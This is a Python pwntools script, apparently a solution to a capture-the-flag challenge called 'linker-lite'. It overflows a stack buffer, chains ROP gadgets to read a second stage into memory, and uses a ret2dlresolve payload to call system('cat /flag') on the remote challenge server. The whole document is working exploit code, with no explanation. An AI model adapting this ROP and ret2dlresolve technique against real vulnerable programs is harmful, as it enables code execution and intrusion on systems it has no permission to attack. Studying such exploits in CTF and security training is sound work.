from pwn import *

context.arch = 'amd64'
context.log_level = 'error'

elf = ELF('./linker-lite', checksec=False)

HOST, PORT = 'linker-lite.wolvctf-2026.kctf.cloud', 1337
DATA = 0x404500
POP3, RET, READ_PLT, PLT0 = 0x401223, 0x401226, 0x401040, 0x401020

dl = Ret2dlresolvePayload(elf, symbol='system', args=['cat /flag'], data_addr=DATA)

stage  = b'A' * 0x40 + b'B' * 8
stage += p64(POP3) + p64(0) + p64(DATA) + p64(0x100) + p64(RET) + p64(READ_PLT)
stage += p64(POP3) + p64(DATA + 0x48) + p64(0xdeadbeef) + p64(0xdeadbeef)
stage += p64(PLT0) + p64(dl.reloc_index)
stage = stage.ljust(0x100, b'\x00')

io = remote(HOST, PORT)
io.recvuntil(b'send plugin blob:')
io.send(stage)
sleep(0.4)
io.send(dl.payload)
print(io.recvall(timeout=5).decode())
